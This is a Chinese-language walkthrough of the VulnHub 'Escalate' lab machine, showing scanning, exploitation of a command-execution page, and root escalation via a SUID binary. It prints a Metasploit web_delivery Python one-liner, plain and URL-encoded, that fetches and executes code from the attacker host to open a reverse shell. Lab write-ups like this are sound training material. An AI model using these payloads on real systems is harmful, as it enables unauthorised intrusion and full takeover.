#  vulnhub之Escalate的实践   
原创 真理  云计算和网络安全技术实践   2024-11-18 00:54  
  
本周实践的是vulnhub的Escalate镜像，  
  
下载地址，https://download.vulnhub.com/escalatelinux/Escalate_Linux.ova，  
  
用virtualbox导入成功，  
  
做地址扫描，sudo netdiscover -r 192.168.0.0/24，  
  
获取到靶机地址是192.168.0.191，  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/F6TniceRacJ0WD3nn9GGPMhzLUH6icxkXtbxqAP7iaQYbv06m3cZRqPNmvqk5ehW9545Au4R1zUomRj64ZpQWPibGQ/640?wx_fmt=png&from=appmsg "")  
  
接着做端口扫描，sudo nmap -sS -sV -T5 -A -p- 192.168.0.191，  
  
发现靶机开了80端口的http服务，  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/F6TniceRacJ0WD3nn9GGPMhzLUH6icxkXtt7V6p4hbUL1p9qwRMsh3cjegnXxBweib322X3eWkR2PictjggMOJw20Q/640?wx_fmt=png&from=appmsg "")  
  
继续对http服务进行路径暴破，dirb http://192.168.0.191 -X .php，  
  
发现http://192.168.0.191/shell.php，  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/F6TniceRacJ0WD3nn9GGPMhzLUH6icxkXtk336h6NiaJap1RicT9OYRibgakO9jujTYPuey3ZhwnSTZX5k4DzMD2MNw/640?wx_fmt=png&from=appmsg "")  
  
浏览器访问http://192.168.0.191/shell.php，提示有命令执行漏洞，  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/F6TniceRacJ0WD3nn9GGPMhzLUH6icxkXtP6RPmBLVO6N94FbAtuO7sL1JWIyLcogHIRtReauicsxK9X7hQ5H0eVA/640?wx_fmt=png&from=appmsg "")  
  
用id验证一下，http://192.168.0.191/shell.php?cmd=id，没问题，  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/F6TniceRacJ0WD3nn9GGPMhzLUH6icxkXtYuNOtN33o3NwSPuZkzpoBuyiaHFWzicUCWpLdgrbficqDqlHKbR2BPD4A/640?wx_fmt=png&from=appmsg "")  
  
上msf，在kali攻击机上制作反弹shell命令，并开启反弹shell监听，  
  
use exploit/multi/script/web_deliveryset SRVHOST 192.168.0.190set SRVPORT 8080set LHOST 192.168.0.190exploit  
  
python -c "import sys;import ssl;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://192.168.0.190:8080/a2mz3sBsA', context=ssl._create_unverified_context());exec(r.read());"  
  
直接执行发现无效，上burpsuite进行url编码，  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/F6TniceRacJ0WD3nn9GGPMhzLUH6icxkXtDUEBVIUPXGW5eibq2jqLzTl6EafFYZibAkSib5TsjtM6rO5YxbuAE0k6A/640?wx_fmt=png&from=appmsg "")  
  
%70%79%74%68%6f%6e%20%2d%63%20%22%69%6d%70%6f%72%74%20%73%79%73%3b%69%6d%70%6f%72%74%20%73%73%6c%3b%75%3d%5f%5f%69%6d%70%6f%72%74%5f%5f%28%27%75%72%6c%6c%69%62%27%2b%7b%32%3a%27%27%2c%33%3a%27%2e%72%65%71%75%65%73%74%27%7d%5b%73%79%73%2e%76%65%72%73%69%6f%6e%5f%69%6e%66%6f%5b%30%5d%5d%2c%66%72%6f%6d%6c%69%73%74%3d%28%27%75%72%6c%6f%70%65%6e%27%2c%29%29%3b%72%3d%75%2e%75%72%6c%6f%70%65%6e%28%27%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%30%2e%31%39%30%3a%38%30%38%30%2f%61%32%6d%7a%33%73%42%73%41%27%2c%20%63%6f%6e%74%65%78%74%3d%73%73%6c%2e%5f%63%72%65%61%74%65%5f%75%6e%76%65%72%69%66%69%65%64%5f%63%6f%6e%74%65%78%74%28%29%29%3b%65%78%65%63%28%72%2e%72%65%61%64%28%29%29%3b%22  
  
再次执行获取到了反弹shell，sessions -i 1进入msf shell，  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/F6TniceRacJ0WD3nn9GGPMhzLUH6icxkXtlR95u0qOibj11icSR9icCengqqAoIkAvaQqznMvxN80nm8Hyf9MYuXCsw/640?wx_fmt=png&from=appmsg "")  
  
进入普通shell，并改成交互式shell，  
  
python -c 'import pty;pty.spawn("/bin/bash")'，  
  
查找root权限程序，find / -perm -u=s -type f 2>/dev/null，  
  
发现/home/user3/shell，进入cd /home/user3，执行./shell，  
  
获取到新的shell，id确认是root，  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/F6TniceRacJ0WD3nn9GGPMhzLUH6icxkXtL5mm7Bxic8x4SeyPj6Pib1r7CTwr9wvPlBaKEiblk1jgTrKZn3louJvaw/640?wx_fmt=png&from=appmsg "")  
  
  
